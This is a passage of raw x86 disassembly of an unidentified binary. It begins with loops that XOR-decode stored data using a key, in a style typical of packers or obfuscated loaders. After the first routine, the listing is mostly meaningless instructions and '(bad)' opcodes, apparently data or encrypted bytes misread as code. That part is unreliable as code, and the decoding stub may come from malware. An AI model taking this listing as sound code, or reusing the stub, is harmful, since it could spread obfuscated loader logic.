  42cff4:	shl    eax,0x8
  42cff7:	add    eax,edx
  42cff9:	mov    ds:0x448d10,eax
  42cffe:	mov    edx,0x417f0333
  42d003:	sub    edx,DWORD PTR ds:0x448d1c
  42d009:	add    ecx,0xc
  42d00c:	xor    edx,eax
  42d00e:	mov    DWORD PTR [ecx-0xc],edx
  42d011:	mov    edx,DWORD PTR ds:0x448048
  42d017:	add    edx,0x8
  42d01a:	mov    DWORD PTR ds:0x448048,edx
  42d020:	movzx  eax,BYTE PTR [edx+0x6]
  42d024:	movzx  edi,WORD PTR [edx+0x3]
  42d028:	movzx  edx,BYTE PTR [edx+0x1]
  42d02c:	shl    eax,0x10
  42d02f:	add    eax,edi
  42d031:	shl    eax,0x8
  42d034:	add    eax,edx
  42d036:	mov    ds:0x448d10,eax
  42d03b:	mov    edx,0x417f0333
  42d040:	sub    edx,DWORD PTR ds:0x448d1c
  42d046:	xor    edx,eax
  42d048:	mov    DWORD PTR [ecx-0x8],edx
  42d04b:	mov    edx,DWORD PTR ds:0x448048
  42d051:	add    edx,0x8
  42d054:	mov    DWORD PTR ds:0x448048,edx
  42d05a:	movzx  eax,BYTE PTR [edx+0x6]
  42d05e:	movzx  edi,WORD PTR [edx+0x3]
  42d062:	movzx  edx,BYTE PTR [edx+0x1]
  42d066:	shl    eax,0x10
  42d069:	add    eax,edi
  42d06b:	shl    eax,0x8
  42d06e:	add    eax,edx
  42d070:	mov    edx,0x417f0333
  42d075:	sub    edx,DWORD PTR ds:0x448d1c
  42d07b:	mov    ds:0x448d10,eax
  42d080:	xor    edx,eax
  42d082:	mov    DWORD PTR [ecx-0x4],edx
  42d085:	mov    edx,DWORD PTR ds:0x448048
  42d08b:	add    edx,0x8
  42d08e:	dec    esi
  42d08f:	mov    DWORD PTR ds:0x448048,edx
  42d095:	jne    0x42cfe3
  42d09b:	push   esi
  42d09c:	call   ebp
  42d09e:	mov    eax,ds:0x448d20
  42d0a3:	add    eax,0x1c764
  42d0a8:	mov    edx,0x101
  42d0ad:	lea    ecx,[ecx+0x0]
  42d0b0:	mov    ecx,DWORD PTR ds:0x44804c
  42d0b6:	mov    ecx,DWORD PTR [ecx]
  42d0b8:	mov    esi,0xe5b437c6
  42d0bd:	sub    esi,DWORD PTR ds:0x448d1c
  42d0c3:	mov    DWORD PTR ds:0x448d10,ecx
  42d0c9:	xor    esi,ecx
  42d0cb:	mov    DWORD PTR [eax],esi
  42d0cd:	add    DWORD PTR ds:0x44804c,0x8
  42d0d4:	add    eax,0x4
  42d0d7:	dec    edx
  42d0d8:	jne    0x42d0b0
  42d0da:	mov    esi,DWORD PTR ds:0x448d20
  42d0e0:	push   edx
  42d0e1:	add    esi,0x1cb68
  42d0e7:	call   ebp
  42d0e9:	mov    ecx,DWORD PTR ds:0x448050
  42d0ef:	mov    edx,0x187
  42d0f4:	pop    ebp
  42d0f5:	movzx  eax,BYTE PTR [ecx+0x7]
  42d0f9:	movzx  edi,BYTE PTR [ecx+0x5]
  42d0fd:	shl    eax,0x8
  42d100:	add    eax,edi
  42d102:	movzx  edi,BYTE PTR [ecx+0x3]
  42d106:	movzx  ecx,BYTE PTR [ecx]
  42d109:	shl    eax,0x8
  42d10c:	add    eax,edi
  42d10e:	shl    eax,0x8
  42d111:	add    eax,ecx
  42d113:	mov    ecx,DWORD PTR ds:0x448d1c
  42d119:	sub    ecx,0x401e6
  42d11f:	neg    ecx
  42d121:	sbb    ecx,ecx
  42d123:	and    ecx,0xe5237ad9
  42d129:	add    ecx,0x1add7fbe
  42d12f:	xor    ecx,eax
  42d131:	mov    ds:0x448d10,eax
  42d136:	mov    DWORD PTR [esi],ecx
  42d138:	mov    ecx,DWORD PTR ds:0x448050
  42d13e:	add    ecx,0x8
  42d141:	add    esi,0x4
  42d144:	dec    edx
  42d145:	mov    DWORD PTR ds:0x448050,ecx
  42d14b:	jne    0x42d0f5
  42d14d:	pop    edi
  42d14e:	pop    esi
  42d14f:	ret    
  42d150:	test   eax,0xffffc6
  42d155:	xchg   edx,eax
  42d156:	add    bh,bh
  42d158:	rcr    BYTE PTR [eax],0xff
  42d15b:	loope  0x42d15d
  42d15d:	call   0xc32bd1e5
  42d162:	mov    DWORD PTR [eax],eax
  42d164:	and    esi,0xffffffff
  42d167:	add    BYTE PTR [esi+eax*1],dh
  42d16a:	add    BYTE PTR [ebx-0xea8501],ah
  42d170:	jbe    0x42d112
  42d172:	inc    DWORD PTR [eax]
  42d174:	push   DWORD PTR [ebp+0x0]
  42d177:	jmp    DWORD PTR [edi+0x90cc89]
  42d17d:	jb     0x42d175
  42d17f:	(bad)  
  42d180:	jmp    0xffd7:0xffffff22
  42d187:	add    BYTE PTR [esi],bl
  42d189:	lea    eax,[ebx-0x3b7d7c4e]
  42d18f:	jmp    DWORD PTR [ecx+eiz*8]
  42d192:	add    DWORD PTR [ebx-0xee7d],0x78
  42d199:	in     al,0xff
  42d19b:	jecxz  0x42d19c
  42d19d:	pop    es
  42d19e:	das    
  42d19f:	add    BYTE PTR [ebp-0x76fffff5],bl
  42d1a5:	cmp    al,BYTE PTR [eax]
  42d1a7:	mov    DWORD PTR [ebx],edx
  42d1a9:	add    BYTE PTR [eax],0x84
  42d1ac:	(bad)  
  42d1ad:	mov    ebx,0x4cc1002c
  42d1b2:	add    bh,bh
  42d1b4:	add    BYTE PTR [ebx+0x0],dh
  42d1b7:	int3   
  42d1b8:	fnstsw WORD PTR [ecx-0x1]
  42d1bb:	fiadd  WORD PTR [eax]
  42d1bd:	jnp    0x42d194
  42d1bf:	push   DWORD PTR [edx-0x68]
  42d1c2:	(bad)  
  42d1c3:	inc    DWORD PTR [eax]
  42d1c5:	lods   al,BYTE PTR ds:[esi]
  42d1c6:	mov    edi,edi
  42d1c8:	pop    edi
  42d1c9:	test   al,0xcc
  42d1cb:	ins    DWORD PTR es:[edi],dx
  42d1cc:	dec    DWORD PTR [esi]
  42d1ce:	sahf   
  42d1cf:	int3   
  42d1d0:	add    eax,0xff0083d6
  42d1d5:	xchg   esi,eax
  42d1d6:	(bad)  
  42d1d7:	(bad)  
  42d1d8:	mov    ebx,0xff98ff93
  42d1dd:	data16 (bad) 
  42d1df:	push   DWORD PTR [ecx]
  42d1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1e2:	(bad)  
  42d1e3:	inc    DWORD PTR [eax]
  42d1e5:	sahf   
  42d1e6:	inc    DWORD PTR [ebx-0x70000cea]
  42d1ec:	call   esi
  42d1ee:	add    bh,bh
  42d1f0:	rep ins BYTE PTR es:[edi],dx
  42d1f2:	int3   
  42d1f3:	add    BYTE PTR [eax],al
  42d1f5:	inc    edx
  42d1f6:	(bad)  
  42d1f7:	jmp    DWORD PTR [esi]
  42d1f9:	cmp    eax,0xb4ff76ff
  42d1fe:	inc    esi
  42d1ff:	inc    ecx
  42d201:	mov    ecx,0x10830000
  42d206:	inc    DWORD PTR [eax]
  42d208:	mov    al,BYTE PTR [eax+eax*1-0x197fff94]
  42d20f:	add    BYTE PTR [edi+0x1e],bh
  42d212:	cmp    edi,0xffffff83
  42d215:	aam    0xff
  42d217:	call   edi
  42d219:	in     eax,dx
  42d21a:	(bad)  
  42d21b:	mov    ebx,0x830db3ff
  42d220:	aas    
  42d221:	mov    ecx,0x69830089
  42d226:	(bad)  
  42d227:	(bad)  
  42d228:	cmp    al,0x4e
  42d22a:	add    BYTE PTR [eax-0x9de07d],al
  42d230:	cdq    
  42d231:	test   al,0x0
  42d233:	dec    esp
  42d235:	add    al,BYTE PTR [eax]
  42d237:	inc    edx
  42d239:	inc    eax
  42d23a:	mov    DWORD PTR [edx],ebx
  42d23c:	jmp    FWORD PTR [ebx]
  42d23e:	inc    ecx
  42d23f:	add    BYTE PTR [eax-0x7f],al
  42d245:	and    eax,0x6e3cffff
  42d24a:	add    BYTE PTR [ebp+0x0],bh
  42d24d:	rol    DWORD PTR ss:[eax],0xbe
  42d251:	ja     0x42d252
  42d253:	inc    DWORD PTR [ebx-0x2000002a]
  42d259:	nop
  42d25a:	(bad)  
  42d25b:	jle    0x42d25c
  42d25d:	dec    eax
  42d25e:	xchg   ebx,eax
  42d25f:	jmp    DWORD PTR [edi-0x3376ff30]
  42d265:	sahf   
  42d266:	mov    edi,edi
  42d268:	icebp  
  42d269:	push   ebx
  42d26a:	add    ah,al
  42d26c:	int3   
  42d26d:	mov    esp,0x384083a9
  42d272:	add    bh,bh
  42d274:	jmp    DWORD PTR [eax+0x1da50083]
  42d27a:	call   ebp
  42d27c:	jmp    FWORD PTR [esi*8-0xec3501]
  42d283:	add    BYTE PTR [ebx-0x10767c90],al
  42d289:	mov    edi,edi
  42d28b:	xchg   edx,eax
  42d28c:	int3   
  42d28d:	pop    eax
  42d28e:	cli    
  42d28f:	dec    esp
  42d291:	adc    eax,0x62cc00ff
  42d296:	add    BYTE PTR [eax],al
  42d298:	and    eax,0xb4ff1d
  42d29d:	fidiv  DWORD PTR [ebx+0x0]
  42d2a0:	inc    ecx
  42d2a1:	inc    DWORD PTR es:[eax]
  42d2a4:	(bad)  
  42d2a5:	(bad)  
  42d2a7:	call   DWORD PTR [edi]
  42d2a9:	mov    bl,0xff
  42d2ab:	mov    edi,0xff83e0cc
  42d2b0:	clc    
  42d2b1:	aas    
  42d2b2:	(bad)  
  42d2b3:	(bad)  
  42d2b4:	dec    DWORD PTR [edx+0x0]
  42d2b7:	add    BYTE PTR [edx-0x72],ch
  42d2ba:	jmp    DWORD PTR [edx-0x1]
  42d2bd:	outs   dx,DWORD PTR ds:[esi]
  42d2be:	adc    bh,bh
  42d2c0:	sub    edx,ebp
  42d2c2:	int3   
  42d2c3:	add    bh,bh
  42d2c5:	mov    bh,bh
  42d2c7:	add    bl,bh
  42d2c9:	sbb    bh,bh
  42d2cb:	aam    0xff
  42d2cd:	push   ss
  42d2ce:	push   edi
  42d2cf:	sub    DWORD PTR [ebp-0x6],0x0
  42d2d3:	mov    edi,edi
  42d2d5:	(bad)  
  42d2d6:	int3   
  42d2d7:	(bad)  
  42d2d8:	fdiv   QWORD PTR [edx]
  42d2da:	add    BYTE PTR [edi+0x0],dh
  42d2dd:	fsub   QWORD PTR [edx-0xa52b7d]
  42d2e3:	add    bh,bh
  42d2e5:	scas   al,BYTE PTR es:[edi]
  42d2e6:	(bad)  
  42d2e7:	call   FWORD PTR [ecx-0x68]
  42d2ea:	int3   
  42d2eb:	pushf  
  42d2ec:	call   FWORD PTR [edi-0x60400f4]
  42d2f2:	add    BYTE PTR [ecx-0x7600fc34],cl
  42d2f8:	into   
  42d2f9:	jecxz  0x42d2fa
  42d2fb:	add    BYTE PTR [eax],al
  42d2fd:	mov    eax,ds:0xa6ab89f2
  42d302:	dec    esp
  42d304:	(bad)  
  42d305:	fiadd  WORD PTR [ebx+0xaf2e83]
  42d30b:	and    BYTE PTR [eax],al
  42d30d:	into   
  42d30e:	or     WORD PTR [esi+0x89ff52],0xffdb
  42d316:	cmp    edi,0x1d
  42d319:	loop   0x42d31a
  42d31b:	inc    DWORD PTR ss:[ebp+0x7ba4fffa]
  42d322:	add    bh,bh
  42d324:	add    BYTE PTR [eax+0x22a68300],al
  42d32a:	or     DWORD PTR [edi+edi*8+0x2e],0xffffffa2
  42d32f:	jmp    DWORD PTR [edx-0x69]
  42d332:	(bad)  
  42d333:	inc    DWORD PTR [eax]
  42d335:	ret    
  42d336:	(bad)  
  42d337:	push   DWORD PTR [edi]
  42d339:	mov    bl,0xff
  42d33b:	(bad)  
  42d33c:	push   DWORD PTR [ebp-0x28]
  42d33f:	or     DWORD PTR [edx+eax*4],0xffffffff
  42d343:	(bad)  
  42d344:	(bad)  
  42d345:	cmp    ecx,esp
  42d347:	call   DWORD PTR [edi]
  42d349:	xchg   esp,eax
  42d34a:	and    DWORD PTR [ebp-0x1],0x33
  42d34e:	ss add ch,bh
  42d351:	mov    bl,0x0
  42d353:	inc    DWORD PTR [eax]
  42d355:	es add bh,bh
  42d358:	(bad)  
  42d359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d35a:	jmp    FWORD PTR [eax+eax*1-0x33003f41]
  42d361:	cmp    al,0x83
  42d363:	(bad)  
  42d364:	dec    DWORD PTR [eax-0x43bb0077]
  42d36a:	adc    DWORD PTR [edi-0xa6e701],0x6c
  42d371:	lahf   
  42d372:	inc    DWORD PTR [eax]
  42d374:	add    al,dl
  42d376:	add    bh,bh
  42d378:	pop    esi
  42d379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d37a:	jmp    DWORD PTR [edx-0x7c532e00]
  42d380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d381:	adc    al,0x89
  42d383:	inc    DWORD PTR [eax]
  42d385:	or     al,BYTE PTR [eax]
  42d387:	call   FWORD PTR [eax]
  42d389:	mov    ecx,0x86ff3cff
  42d38e:	xchg   ebx,eax
  42d38f:	(bad)  
  42d390:	stc    
  42d391:	fimul  DWORD PTR [ecx-0x33670001]
  42d397:	(bad)  
  42d398:	mov    esp,0xff12ff7b
  42d39d:	ficomp WORD PTR [edi+edi*8-0x4769]
  42d3a4:	call   DWORD PTR [edi]
  42d3a6:	or     esp,0x17
  42d3a9:	mov    eax,0x3aff7889
  42d3ae:	nop
  42d3af:	inc    DWORD PTR [ebx-0x7c33ff2f]
  42d3b5:	mov    cl,0xff
  42d3b7:	inc    DWORD PTR [edx+edi*1]
  42d3ba:	adc    DWORD PTR [ecx-0x1],0xffffffa7
  42d3be:	sbb    eax,DWORD PTR [ebx-0xffa324]
  42d3c4:	cmp    DWORD PTR [esi-0x77],0x0
  42d3c8:	xor    DWORD PTR [edi+edi*8+0x28],0xffbe5e00
  42d3d0:	add    ebx,edi
  42d3d2:	add    bh,bh
  42d3d4:	sbb    DWORD PTR [esi-0x41747c77],0xffffffff
  42d3db:	jg     0x42d366
  42d3dd:	pop    ss
  42d3de:	sub    edi,edi
  42d3e0:	pop    eax
  42d3e1:	inc    esi
  42d3e2:	add    ah,cl
  42d3e4:	add    BYTE PTR [ebx+0x627700cc],ch
  42d3ea:	add    BYTE PTR [ecx-0x1],ah
  42d3ed:	sub    DWORD PTR [edx-0x7d],esp
  42d3f0:	stc    
  42d3f1:	leave  
  42d3f2:	(bad)  
  42d3f3:	inc    DWORD PTR [eax]
  42d3f5:	aas    
  42d3f6:	add    bh,bh
  42d3f8:	and    eax,0xff71894c
  42d3fd:	jl     0x42d3cf
  42d3ff:	cmp    DWORD PTR [edi],0xffffff83
  42d402:	dec    esp
  42d404:	add    BYTE PTR [ecx],cl
  42d406:	add    bh,bh
  42d408:	sub    eax,0xff8100b2
  42d40d:	sti    
  42d40e:	gs add edi,0xb
  42d412:	int3   
  42d413:	(bad)  
  42d414:	dec    DWORD PTR [edi]
  42d416:	add    ah,cl
  42d418:	adc    edx,DWORD PTR [ebx-0x34]
  42d41b:	test   DWORD PTR [ecx+0xa89383d],0xffff61
  42d425:	sub    edi,edi
  42d427:	xor    DWORD PTR [ecx+0x20],0x0
  42d42b:	dec    esp
  42d42c:	add    BYTE PTR [eax-0x6d],cl
  42d42f:	mov    DWORD PTR [esp+ecx*2-0x7c00ff7d],edx
  42d436:	add    BYTE PTR [eax],al
  42d438:	sbb    eax,0xff090000
  42d43d:	adc    esi,DWORD PTR [ebx]
  42d43f:	sub    DWORD PTR [eax],0x38
  42d442:	(bad)  
  42d443:	(bad)  
  42d444:	jmp    FWORD PTR [edi]
  42d446:	inc    DWORD PTR [eax]
  42d448:	pop    ebp
  42d449:	dec    eax
  42d44a:	dec    DWORD PTR [eax+0x0]
  42d44d:	jmp    0x42d48e
  42d44f:	(bad)  
  42d450:	ds jp  0x42d452
  42d453:	add    ah,cl
  42d455:	cmp    al,BYTE PTR [ebx-0x33a10200]
  42d45b:	or     al,0x0
  42d45d:	push   cs
  42d45e:	dec    ebx
  42d45f:	(bad)  
  42d460:	stc    
  42d461:	lods   al,BYTE PTR ds:[esi]
  42d462:	cmp    edi,0xffffffff
  42d465:	or     edi,edi
  42d467:	int3   
  42d468:	push   eax
  42d469:	pop    ecx
  42d46a:	add    al,al
  42d46c:	inc    edx
  42d46e:	mov    ebx,0x83cf1500
  42d473:	add    DWORD PTR [eax],0xffffffa3
  42d476:	int3   
  42d477:	inc    DWORD PTR [eax]
  42d479:	jo     0x42d47b
  42d47b:	jnp    0x42d47c
  42d47d:	in     eax,0x7b
  42d47f:	int3   
  42d480:	aad    0x82
  42d482:	cmp    edi,0xffffffff
  42d485:	leave  
  42d486:	add    bh,bh
  42d488:	add    ax,0x25ff
  42d48c:	dec    DWORD PTR [eax]
  42d48e:	test   DWORD PTR [ebx+0xffe080],eax
  42d494:	jmp    FWORD PTR [ebx-0x1]
  42d497:	mov    DWORD PTR [esp+ebx*4-0xe003500],esi
  42d49e:	jb     0x42d4a0
  42d4a0:	call   0xffb0:0x83ccff16
  42d4a7:	add    BYTE PTR [edx],bl
  42d4a9:	mov    eax,ds:0x4a835700
  42d4ae:	(bad)  
  42d4b0:	sar    DWORD PTR [edi+edi*8+0x0],0xff
  42d4b5:	xlat   BYTE PTR ds:[ebx]
  42d4b6:	cmp    edi,0xffffffb4
  42d4b9:	cmp    bh,bh
  42d4bb:	adc    bh,bh
  42d4bd:	sbb    eax,0x3c0eff75
  42d4c2:	cmp    edi,0xffffffff
  42d4c5:	xor    al,0x89
  42d4c7:	or     DWORD PTR [esi],0x54
  42d4ca:	push   DWORD PTR [ebx]
  42d4cc:	add    bh,bl
  42d4ce:	mov    al,BYTE PTR [ebx-0x7c9ff7]
  42d4d4:	add    BYTE PTR [eax+eax*1+0x0],bl
  42d4d8:	enter  0xff35,0x72
  42d4dc:	add    BYTE PTR [ecx],bl
  42d4de:	dec    ebp
  42d4df:	add    BYTE PTR [esi+esi*1+0x4bff0089],cl
  42d4e6:	inc    DWORD PTR [eax]
  42d4e8:	test   al,0x5
  42d4ea:	add    BYTE PTR [eax-0x3d6d01],dh
  42d4f0:	neg    DWORD PTR [edi+edi*8+0x0]
  42d4f4:	call   FWORD PTR [esi+0x3123ffff]
  42d4fa:	mov    DWORD PTR [eax-0x457d],edi
  42d500:	inc    esi
  42d501:	adc    edi,edi
  42d503:	add    ah,cl
  42d505:	sbb    al,BYTE PTR [eax]
  42d507:	jmp    ecx
  42d509:	cmp    al,0x83
  42d50b:	adc    edi,edi
  42d50d:	sahf   
  42d50e:	push   ss
  42d50f:	int3   
  42d510:	shl    DWORD PTR [edi+edi*8-0x1],cl
  42d514:	push   DWORD PTR [edi+edi*8-0xb3bc00]
  42d51b:	add    BYTE PTR [eax],0x22
  42d51e:	stos   DWORD PTR es:[edi],eax
  42d51f:	push   DWORD PTR [esi]
  42d521:	daa    
  42d522:	int3   
  42d523:	add    DWORD PTR [eax],0xffffffb1
  42d526:	dec    esp
  42d528:	jecxz  0x42d4f1
  42d52a:	call   FWORD PTR ds:0x2289ff
  42d530:	mov    eax,ds:0x83ffff14
  42d535:	adc    eax,DWORD PTR [ebx-0x7cb3d200]
  42d53b:	add    BYTE PTR [eax],0x1c
  42d53e:	inc    ebp
  42d53f:	(bad)  
  42d540:	fstp   st(4)
  42d542:	dec    DWORD PTR [ecx+0xff0c89]
  42d548:	mov    esp,0xc5ff43
  42d54d:	in     eax,0xef
  42d54f:	sbb    edi,0xffffffcd
  42d552:	or     esp,0xffffff89
  42d555:	(bad)  
  42d556:	(bad)  
  42d557:	jmp    FWORD PTR [esi]
  42d559:	pop    esp
  42d55a:	or     DWORD PTR [ebp+0xfa2ecc],0x3f
  42d561:	out    dx,eax
  42d562:	(bad)  
  42d563:	(bad)  
  42d564:	inc    DWORD PTR ds:0x35008383
  42d56a:	inc    eax
  42d56c:	int3   
  42d56d:	jno    0x42d541
  42d56f:	add    dh,ah
  42d571:	ss cmp edi,0x0
  42d575:	pushf  
  42d576:	add    BYTE PTR [ebx+0xe00f352],al
  42d57c:	add    BYTE PTR [ebx-0x1afcfffa],ch
  42d582:	(bad)  
  42d583:	(bad)  
  42d584:	jmp    FWORD PTR [edi+edi*8-0x1]
  42d588:	push   ebp
  42d589:	daa    
  42d58a:	push   DWORD PTR [esi]
  42d58c:	add    BYTE PTR [eax-0x557100cf],cl
  42d592:	inc    DWORD PTR [eax]
  42d594:	(bad)  
  42d595:	fcos   
  42d597:	(bad)  
  42d598:	out    dx,al
  42d599:	enter  0x7d83,0x0
  42d59d:	scas   al,BYTE PTR es:[edi]
  42d59e:	jno    0x42d59f
  42d5a0:	pop    edi
  42d5a1:	(bad)  
  42d5a2:	int3   
  42d5a3:	add    BYTE PTR [eax],al
  42d5a5:	cmc    
  42d5a6:	add    DWORD PTR [ebx-0x6b002c9f],0xffffffff
  42d5ad:	out    dx,eax
  42d5ae:	jns    0x42d5b0
  42d5b0:	sbb    eax,0xffffffbf
  42d5b5:	jecxz  0x42d5b7
  42d5b7:	add    BYTE PTR [eax],dl
  42d5b9:	add    BYTE PTR ds:[ebp+0xf6aa00],al
  42d5c0:	aaa    
  42d5c1:	aad    0x83
  42d5c3:	add    BYTE PTR [ebx+0x4489ffba],al
  42d5c9:	push   ebp
  42d5ca:	push   DWORD PTR [ecx-0x76880a01]
  42d5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5d1:	js     0x42d5d3
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	push   eax
  42d5d6:	dec    DWORD PTR [ecx-0x27003673]
  42d5dc:	add    BYTE PTR [esi-0x4a],bl
  42d5df:	add    bh,bh
  42d5e1:	call   0xcc:0x6c000000
  42d5e8:	fisttp DWORD PTR [ebp-0xc000e01]
  42d5ee:	das    
  42d5ef:	add    BYTE PTR [eax],dh
  42d5f1:	adc    BYTE PTR [ebx-0x1e7c7d],al
  42d5f7:	int3   
  42d5f8:	or     al,cl
  42d5fa:	add    BYTE PTR [esi-0x77],cl
  42d5fd:	outs   dx,WORD PTR ds:[esi]
  42d5ff:	add    BYTE PTR [eax+ebp*4-0x1],ch
  42d603:	add    ah,cl
  42d605:	icebp  
  42d606:	mov    edi,edi
  42d608:	stos   BYTE PTR es:[edi],al
  42d609:	cmp    al,0x89
  42d60b:	js     0x42d590
  42d60d:	mov    ebx,0x79a0ffc4
  42d612:	add    bh,bh
  42d614:	add    BYTE PTR [ecx-0x1],bh
  42d617:	add    ch,bl
  42d619:	pop    ebx
  42d61a:	add    BYTE PTR [esi],dh
  42d61c:	or     ebp,0xffffffd5
  42d61f:	int3   
  42d620:	js     0x42d6a1
  42d622:	int3   
  42d623:	add    ah,cl
  42d625:	push   esp
  42d626:	add    BYTE PTR [eax],al
  42d628:	xchg   ebx,eax
  42d629:	sbb    bh,bh
  42d62b:	stos   DWORD PTR es:[edi],eax
  42d62c:	add    BYTE PTR [esi+esi*8],bh
  42d62f:	add    BYTE PTR [edx-0x33ff67],ah
  42d635:	das    
  42d636:	add    bh,bh
  42d638:	add    BYTE PTR fs:[eax],0x18
  42d63c:	inc    ecx
  42d63e:	arpl   WORD PTR [eax],ax
  42d640:	nop
  42d641:	fmul   st,st(4)
  42d643:	inc    DWORD PTR [eax]
  42d645:	lods   al,BYTE PTR ds:[esi]
  42d646:	add    DWORD PTR [ebx+0x48fff912],0xffffffcc
  42d64d:	cs dec edi
  42d64f:	call   DWORD PTR [ebx-0x7c000012]
  42d655:	mov    dh,0x83
  42d657:	sbb    DWORD PTR [ebx],0x35
  42d65a:	add    BYTE PTR [edi+edi*8+0x6e],ah
  42d65e:	dec    ecx
  42d65f:	inc    DWORD PTR [ebp-0x7c7c7c67]
  42d665:	mov    al,BYTE PTR [ebx+0x7e8000]
  42d66b:	pop    ebx
  42d66c:	(bad)  
  42d66d:	mov    eax,0xcb7f83f8
  42d672:	add    bh,bh
  42d674:	push   DWORD PTR [edx+0x21fe0083]
  42d67a:	inc    DWORD PTR ds:0xffabda00
  42d680:	ror    BYTE PTR [edi],1
  42d682:	int3   
  42d683:	(bad)  
  42d684:	jmp    edi
  42d686:	add    DWORD PTR [eax],0x3
  42d689:	scas   eax,DWORD PTR es:[edi]
  42d68a:	jmp    DWORD PTR [ebx+eax*4+0x1fff45b2]
  42d691:	cmp    bh,bh
  42d693:	inc    DWORD PTR [eax]
  42d695:	push   0xdb60ffff
  42d69a:	call   DWORD PTR [edi+edi*8+0x14]
  42d69e:	mov    edx,0xff011cff
  42d6a3:	or     esp,0x5f
  42d6a6:	int3   
  42d6a7:	(bad)  
  42d6a8:	(bad)  
  42d6a9:	xor    eax,0x91ff94ff
  42d6ae:	lods   eax,DWORD PTR ds:[esi]
  42d6af:	add    DWORD PTR [eax-0x33007c39],0x34
  42d6b6:	cmp    edi,0xffffffd7
  42d6b9:	mov    dl,0x83
  42d6bb:	retf   0x7000
  42d6be:	mov    eax,0x3fb9cc
  42d6c3:	add    BYTE PTR [eax],al
  42d6c5:	sar    bh,1
  42d6c7:	mov    DWORD PTR [esi-0x335a7cd7],eax
  42d6cd:	popa   
  42d6ce:	repz add BYTE PTR [ebx],ch
  42d6d1:	cld    
  42d6d2:	(bad)  
  42d6d3:	dec    DWORD PTR [ecx+0x238300b9]
  42d6d9:	daa    
  42d6da:	call   FWORD PTR [ebp-0x9cad01]
  42d6e0:	sbb    al,0xa0
  42d6e2:	or     esp,0xffffffff
  42d6e5:	dec    edi
  42d6e6:	mov    edi,edi
  42d6e8:	cmp    edi,DWORD PTR [ecx+0xbffefff]
  42d6ee:	mov    ebp,0x394ccc
  42d6f3:	(bad)  
  42d6f4:	call   DWORD PTR [edx-0x54d57c01]
  42d6fa:	inc    DWORD PTR [eax]
  42d6fc:	sub    DWORD PTR [eax+0x40],0xffffff83
  42d700:	sar    DWORD PTR [ebp-0x25760100],cl
  42d706:	add    BYTE PTR [ebx-0x3fff6a0a],al
  42d70c:	add    BYTE PTR [ecx+0x7947005f],dl
  42d712:	add    bh,bh
  42d714:	inc    DWORD PTR [edx-0x1]
  42d717:	call   FWORD PTR [esi]
  42d719:	mov    WORD PTR [ecx+0x53df00dd],cs
  42d71f:	cmp    ebx,0xffffffea
  42d722:	mov    edi,edi
  42d724:	jmp    FWORD PTR [ecx]
  42d726:	(bad)  
  42d727:	call   DWORD PTR [edx]
  42d729:	add    BYTE PTR [eax],0xc0
  42d72c:	dec    DWORD PTR ds:0x114b83c2
  42d732:	inc    DWORD PTR [eax]
  42d734:	(bad)  
  42d735:	jg     0x42d6ba
  42d737:	int3   
  42d738:	outs   dx,DWORD PTR ds:[esi]
  42d739:	adc    al,0xff
  42d73b:	jmp    0x8ec8:0xc87ff
  42d742:	cmp    edi,0xffffffff
  42d745:	das    
  42d746:	add    BYTE PTR [eax],al
  42d748:	mov    ds:0x53ffc5,eax
  42d74d:	lahf   
  42d74e:	dec    ebx
  42d74f:	sbb    DWORD PTR [edi-0x3a],0xffffffff
  42d753:	add    BYTE PTR [ecx+0x2fffff2d],cl
  42d759:	(bad)
  42d75d:	xor    BYTE PTR [eax+0xf12000],cl
  42d763:	inc    DWORD PTR [ebx-0x4fff0072]
  42d769:	sbb    bh,bh
  42d76b:	in     al,dx
  42d76c:	(bad)  
  42d76d:	call   0x96315aa1
  42d772:	(bad)  
  42d773:	inc    DWORD PTR [ebx+0x76ffffae]
  42d779:	jmp    DWORD PTR cs:[edi+edi*8-0x6300fc34]
  42d781:	cld    
  42d782:	add    BYTE PTR [ebx-0x7c000900],al
  42d788:	jmp    0x42d787
  42d78a:	mov    DWORD PTR [ecx-0x24d334],esp
  42d790:	xchg   ebp,eax
  42d791:	in     al,0x0
  42d793:	(bad)  
  42d794:	jmp    FWORD PTR [ebx]
  42d796:	add    bh,bh
  42d798:	jle    0x42d7dd
  42d79a:	add    cl,dl
  42d79c:	inc    ebx
  42d79e:	repz sbb DWORD PTR [edx],0x79
  42d7a2:	inc    DWORD PTR [eax]
  42d7a4:	xor    edi,0xffffff89
  42d7a7:	jmp    FWORD PTR ds:0xcc9f0093
  42d7ad:	fsubr  QWORD PTR [ecx+0x435f00]
  42d7b3:	dec    DWORD PTR [ecx+0x42cc00d4]
  42d7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7ba:	add    bh,cl
  42d7bc:	sub    DWORD PTR [edx+0x54],0xffffffff
  42d7c0:	inc    esp
  42d7c1:	(bad)  
  42d7c2:	dec    DWORD PTR [ecx+0xe700]
  42d7c8:	jmp    0x1ad70a
  42d7cd:	xchg   ebx,eax
  42d7ce:	dec    edi
  42d7cf:	call   DWORD PTR [edx+ecx*1-0x1100ff01]
  42d7d6:	cmp    edi,0xffffffa9
  42d7d9:	inc    edx
  42d7da:	call   FWORD PTR [eax]
  42d7dc:	dec    DWORD PTR [ebx-0x4c]
  42d7df:	push   DWORD PTR [edi]
  42d7e1:	cmp    al,BYTE PTR [eax]
  42d7e3:	int3   
  42d7e4:	call   FWORD PTR [eax+eax*1]
  42d7e7:	or     DWORD PTR [esi],0xffffffe8
  42d7ea:	jmp    FWORD PTR [ecx-0x7d]
  42d7ed:	and    al,0xd1
  42d7ef:	(bad)  
  42d7f0:	dec    DWORD PTR ds:0x70ffcc89
  42d7f6:	inc    DWORD PTR [ebx-0x797ce84b]
  42d7fc:	call   FWORD PTR [ecx+0x56efffde]
  42d802:	(bad)  
  42d803:	inc    DWORD PTR [ebx-0x9ff7c41]
  42d809:	ret    0x82ff
  42d80c:	jmp    DWORD PTR [ebx+0x4fedff7f]
  42d812:	inc    DWORD PTR [ebx-0x7c001277]
  42d818:	repz pop ebx
  42d81a:	int3   
  42d81b:	inc    ebp
  42d81c:	add    BYTE PTR [esi+0x64],dl
  42d81f:	or     DWORD PTR [ebp+0x57],0x0
  42d823:	inc    DWORD PTR [eax]
  42d825:	pop    esi
